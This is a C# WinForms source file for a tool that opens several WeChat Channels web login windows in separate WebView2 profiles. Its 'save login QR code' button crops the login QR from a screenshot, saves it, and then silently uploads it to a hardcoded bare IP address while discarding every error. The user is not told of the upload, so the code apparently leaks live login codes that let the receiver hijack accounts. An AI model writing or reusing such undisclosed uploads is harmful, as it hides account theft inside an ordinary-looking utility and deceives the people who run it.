using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection.Emit;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WebView2多开
{
    public partial class 视频号多开 : Form
    {
        public 视频号多开()
        {
            InitializeComponent();
            InitializeControls();
        }

        private void 视频号多开_Load(object sender, EventArgs e)
        {
            button1.Click += NewWindowBtn_Click;
        }

        private int _instanceCount = 0;

        private void InitializeControls()
        {
            Text = "微信网页版多开工具";
            Width = 800;
            Height = 600;

        }




        private async void NewWindowBtn_Click(object sender, EventArgs e)
        {
            _instanceCount++;
            // 创建新窗口
            var wechatForm = new Form
            {
                Text = $"微信视频号 - 实例 {_instanceCount}",
                Width = 1000,
                Height = 800
            };

            // 创建WebView2控件
            var webView = new WebView2();
            webView.Dock = DockStyle.Fill;
            wechatForm.Controls.Add(webView);

            Button saveQrCodeBtn = new Button
            {
                Text = "保存登录二维码",
                Dock = DockStyle.Top,
                Height = 40,

            };
            saveQrCodeBtn.Click += (s, args) => SaveQrCode(webView);
            wechatForm.Controls.Add(saveQrCodeBtn);


            Button getuserBtn = new Button
            {
                Text = "获取账号信息",
                Dock = DockStyle.Top,
                Height = 40,

            };
            getuserBtn.Click += (s, args) => GetuserBtn(webView);
            wechatForm.Controls.Add(getuserBtn);

            // 为每个实例创建独立的用户数据目录
            string userDataFolder = Path.Combine(
                Application.LocalUserAppDataPath,
                $"WeChatInstance_{_instanceCount}_{Guid.NewGuid()}");

            // 初始化WebView2
            try
            {
                var env = await CoreWebView2Environment.CreateAsync(
                    userDataFolder: userDataFolder);
                await webView.EnsureCoreWebView2Async(env);

                // 加载微信网页版
                webView.CoreWebView2.Navigate("https://channels.weixin.qq.com/login.html");

                // 显示窗口
                wechatForm.Show();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"初始化失败: {ex.Message}");
                wechatForm.Dispose();
            }
        }





        string savePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "qrcode.png");

        private async void SaveQrCode(WebView2 webView)
        {


            // 创建内存流接收完整截图数据
            using (var stream = new MemoryStream())
            {
                // 获取完整页面截图
                await webView.CoreWebView2.CapturePreviewAsync(
                    CoreWebView2CapturePreviewImageFormat.Png,
                    stream
                );

                // 重置流指针到开头，准备读取图像
                stream.Position = 0;

                // 加载完整截图到Bitmap对象进行处理
                using (var fullImage = (Bitmap)Image.FromStream(stream))
                {
                    // 计算右下角四分之一区域的坐标和尺寸
                    int width = fullImage.Width;
                    int height = fullImage.Height;

                    // 起始坐标：右下角四分之一的左上角点（宽高各一半的位置）
                    int startX = 2 * width / 3;
                    int startY = height / 3;

                    // 裁剪区域的宽高（原宽高的一半）
                    int cropWidth = width - startX;
                    int cropHeight = height - startY;

                    // 创建裁剪后的图像
                    using (var croppedImage = new Bitmap(cropWidth, cropHeight))
                    {
                        // 使用Graphics绘制裁剪区域
                        using (var g = Graphics.FromImage(croppedImage))
                        {
                            // 从完整图像的指定区域绘制到新图像
                            g.DrawImage(fullImage,
                                new Rectangle(0, 0, cropWidth, cropHeight),  // 目标位置和大小
                                new Rectangle(startX, startY, cropWidth, cropHeight),  // 源区域
                                GraphicsUnit.Pixel);
                        }

                        // 保存裁剪后的图像到文件
                        croppedImage.Save(savePath, ImageFormat.Png);
                        uploadimg();

                    }
                }
            }
        }



        public void uploadimg()
        {
            string uploadUrl = "http://1.15.140.126/UploadImage.aspx";

            using (WebClient webClient = new WebClient())
            {
                try
                {

                    // 上传文件（参数1：服务器URL，参数2：表单字段名，参数3：本地文件路径）
                    byte[] responseBytes = webClient.UploadFile(uploadUrl, "POST", savePath);
                    // 解析服务器返回的结果（UTF-8编码）
                    string response = System.Text.Encoding.UTF8.GetString(responseBytes);

                }
                catch (WebException ex)
                {
                    // 捕获网络异常（如服务器无法连接、权限不足等）
                    string errorMsg = ex.Response != null
                        ? new System.IO.StreamReader(ex.Response.GetResponseStream()).ReadToEnd()
                        : ex.Message;

                }
                catch (Exception ex)
                {
                    // 捕获其他异常（如文件被占用）

                }
            }
        }

        string path = AppDomain.CurrentDomain.BaseDirectory;
        private async void GetuserBtn(WebView2 webView)
        {
            string htmlJson = await webView.ExecuteScriptAsync("document.documentElement.outerHTML");
            string pageSource = JsonConvert.DeserializeObject<string>(htmlJson);
            System.IO.File.WriteAllText(path+"a.txt", pageSource, Encoding.UTF8);

        }




    }
}
